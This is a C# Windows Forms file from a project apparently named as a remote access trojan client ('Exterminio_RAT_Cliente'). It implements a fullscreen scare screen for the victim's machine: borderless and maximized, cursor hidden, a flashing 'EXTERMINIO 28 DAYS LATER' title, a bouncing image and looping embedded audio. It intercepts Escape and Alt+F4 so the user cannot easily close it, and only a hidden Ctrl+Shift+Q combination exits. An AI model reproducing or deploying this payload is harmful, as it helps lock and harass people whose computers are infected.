using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Exterminio_RAT_Cliente
{
    public partial class Exterminar : Form
    {
        private Label lblTitulo;
        private PictureBox picture;
        private Timer animTimer;
        private Random rand;
        private int dx = 5, dy = 5;
        private int brillo = 0;
        private bool subir = true;

        // SoundPlayer para reproducir audio
        private SoundPlayer player;

        public Exterminar()
        {
            InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.BackColor = Color.Black;
            this.KeyPreview = true;

            Cursor.Hide();
            rand = new Random();

            // Texto
            lblTitulo = new Label
            {
                Text = "EXTERMINIO\n28 DAYS LATER",
                Font = new Font("Arial Black", 64, FontStyle.Bold),
                ForeColor = Color.Red,
                BackColor = Color.Transparent,
                AutoSize = true,
                Location = new Point(
                    (Screen.PrimaryScreen.Bounds.Width / 2) - 400,
                    (Screen.PrimaryScreen.Bounds.Height / 2) - 200
                )
            };
            this.Controls.Add(lblTitulo);

            // PictureBox
            picture = new PictureBox
            {
                Image = Image.FromFile("tu_imagen.png"),
                SizeMode = PictureBoxSizeMode.Zoom,
                Size = new Size(200, 200),
                Location = new Point(100, 100)
            };
            this.Controls.Add(picture);

            // Timer animaciones
            animTimer = new Timer { Interval = 50 };
            animTimer.Tick += Animar;
            animTimer.Start();

            // Manejar teclas
            this.KeyDown += Exterminar_KeyDown;


            // Reproducir audio de resources
            byte[] audioBytes = Properties.Resources.Infeccion_Cliente_Rage;
            using (MemoryStream audioStream = new MemoryStream(audioBytes))
            {
                player = new SoundPlayer(audioStream);
                player.PlayLooping(); // se reproduce en loop
            }
        }

        private void Animar(object sender, EventArgs e)
        {
            if (subir) brillo += 15; else brillo -= 15;
            if (brillo >= 255) subir = false;
            if (brillo <= 50) subir = true;
            lblTitulo.ForeColor = Color.FromArgb(brillo, 255, 0, 0);

            var pos = picture.Location;
            pos.X += dx;
            pos.Y += dy;
            if (pos.X < 0 || pos.X + picture.Width > this.Width) dx = -dx;
            if (pos.Y < 0 || pos.Y + picture.Height > this.Height) dy = -dy;
            picture.Location = pos;
        }

        private void Exterminar_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape || (e.Alt && e.KeyCode == Keys.F4))
            {
                e.Handled = true;
            }
            if (e.Control && e.Shift && e.KeyCode == Keys.Q)
            {
                player.Stop(); // detener audio al salir
                Application.Exit();
            }
        }

    }
}
